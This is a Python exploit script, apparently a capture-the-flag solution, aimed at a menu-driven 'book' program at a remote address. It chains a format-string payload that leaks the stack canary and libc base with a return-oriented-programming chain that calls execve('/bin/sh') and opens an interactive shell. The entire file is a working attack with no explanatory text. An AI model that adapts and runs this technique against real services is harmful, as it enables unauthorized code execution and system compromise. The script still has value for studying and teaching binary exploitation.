from ptrlib import *

def open_book():
    sock.sendlineafter("> ", "1")
    return

def read_book():
    sock.sendlineafter("> ", "2")
    x = sock.recvuntil("\n")
    if b"fread" in x: return None
    text = sock.recvuntil("*").rstrip(b"*")
    return text

def read_book_pwn(data):
    sock.sendlineafter("> ", "2")
    sock.send(data)
    sock.recvuntil("*\n")
    text = sock.recvuntil("*").rstrip(b"*")
    return text

def edit_book(offset, text):
    sock.sendlineafter("> ", "3")
    sock.sendlineafter("Offset: ", str(offset))
    sock.sendafter("Text: ", text)
    return

def close_book():
    sock.sendlineafter("> ", "4")
    return

libc = ELF("/lib/x86_64-linux-gnu/libc-2.27.so")
#sock = Process("../distfiles/chall")
sock = Socket("13.231.207.73", 9008)
delta = 0xe7
rop_pop_rdi = 0x0002155f
rop_pop_rsi = 0x00023e6a
rop_pop_rdx = 0x00001b96
rop_pop_rax = 0x000439c7
rop_syscall = 0x000013c0

# Leak libc base and canary
payload = b'A' * 0x10
payload += p64(0) # fp
payload += p64(0) # init
payload += b"\x00" * 0x10
payload += b"%10$p.%22$p." # filepath (34 bytes will be printed here)
payload += str2bytes("%{}c%6$hn".format(46 - 34)) # set filepath = ".\x00"
open_book()
read_book()
edit_book(0x1f0, payload)

open_book()
r = sock.recvuntil(":").rstrip(b":").split(b".")
canary = int(r[0], 16)
libc_base = int(r[1], 16) - libc.symbol("__libc_start_main") - delta
logger.info("canary = " + hex(canary))
logger.info("libc base = " + hex(libc_base))

# ROP
payload = b'A' * 0x10
payload += p64(0) # fp
payload += p64(0) # init
payload += b"\x00" * 0x10
payload += b"/proc/self/fd/0\x00" # filepath
open_book()
read_book()
edit_book(0x1f0, payload)

payload = b"A" * (0x200)# - 3 + 8)
payload += p64(0)
payload += p64(canary)
payload += p64(0)
payload += p64(libc_base + rop_pop_rdi)
payload += p64(libc_base + next(libc.find("/bin/sh")))
payload += p64(libc_base + rop_pop_rsi)
payload += p64(0)
payload += p64(libc_base + rop_pop_rdx)
payload += p64(0)
payload += p64(libc_base + rop_pop_rax)
payload += p64(59)
payload += p64(libc_base + rop_syscall)
payload += b'\x00' * (0x4000 - len(payload))
open_book()
read_book_pwn(payload)
sock.recvline()

# Get the shell!!!
sock.interactive()
